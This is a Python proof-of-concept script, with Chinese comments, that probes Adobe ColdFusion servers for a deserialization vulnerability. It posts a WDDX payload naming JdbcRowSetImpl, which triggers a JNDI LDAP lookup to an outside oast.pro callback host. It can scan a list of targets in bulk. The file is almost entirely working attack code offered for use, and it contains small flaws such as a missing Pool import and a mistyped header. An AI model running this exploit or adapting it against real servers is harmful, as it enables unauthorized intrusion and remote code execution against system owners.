#导包
import requests,re,json,argparse,sys
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """
              _       _             _____      _     _ ______         _               _____                      _       _ _          _   _              __      __    _                      _     _ _ _ _         
     /\      | |     | |           / ____|    | |   | |  ____|       (_)             |  __ \                    (_)     | (_)        | | (_)             \ \    / /   | |                    | |   (_) (_) |        
    /  \   __| | ___ | |__   ___  | |     ___ | | __| | |__ _   _ ___ _  ___  _ __   | |  | | ___  ___  ___ _ __ _  __ _| |_ ______ _| |_ _  ___  _ __    \ \  / /   _| |_ __   ___ _ __ __ _| |__  _| |_| |_ _   _ 
   / /\ \ / _` |/ _ \| '_ \ / _ \ | |    / _ \| |/ _` |  __| | | / __| |/ _ \| '_ \  | |  | |/ _ \/ __|/ _ \ '__| |/ _` | | |_  / _` | __| |/ _ \| '_ \    \ \/ / | | | | '_ \ / _ \ '__/ _` | '_ \| | | | __| | | |
  / ____ \ (_| | (_) | |_) |  __/ | |___| (_) | | (_| | |  | |_| \__ \ | (_) | | | | | |__| |  __/\__ \  __/ |  | | (_| | | |/ / (_| | |_| | (_) | | | |    \  /| |_| | | | | |  __/ | | (_| | |_) | | | | |_| |_| |
 /_/    \_\__,_|\___/|_.__/ \___|  \_____\___/|_|\__,_|_|   \__,_|___/_|\___/|_| |_| |_____/ \___||___/\___|_|  |_|\__,_|_|_/___\__,_|\__|_|\___/|_| |_|     \/  \__,_|_|_| |_|\___|_|  \__,_|_.__/|_|_|_|\__|\__, |
                                                                                                                                                                                                               __/ |
                                                                                                                                                                                                              |___/ 



"""
    print(test)
#主函数
def main():
    banner()
    parse = argparse.ArgumentParser(description="Adobe ColdFusion反序列化漏洞")
    #添加参数
    parse.add_argument('-u','--url',dest='url',type=str,help="please input url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

#poc函数
def poc(target):
    payload = '///CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true'
    headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36',
                'Connection': 'close',
                'Content-Length': '306',
                'ontent-Type': 'application/x-www-form-urlencoded',
                'Accept-Encoding': 'gzip, deflate'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data = "argumentCollection=<wddxPacket+version%3d'1.0'><header/><data><struct+type%3d'xcom.sun.rowset.JdbcRowSetImplx'><var+name%3d'dataSourceName'><string>ldap%3a//ciqfss5blq626n2ml30gbaxsdjo54p9cq.oast.pro/rcrzfd</string></var><var+name%3d'autoCommit'><boolean+value%3d'true'/></var></struct></data></wddxPacket>"
    res = requests.post(url=target + payload,headers=headers,data=data,verify=False)
    if res.status_code == 500 and '/TD' in res.text:
        print(f'[+]{target}存在漏洞')
    else:
        print(f'[-]{target}不存在漏洞')
    
    
#函数入口
if __name__ =="__main__":
    main()
    
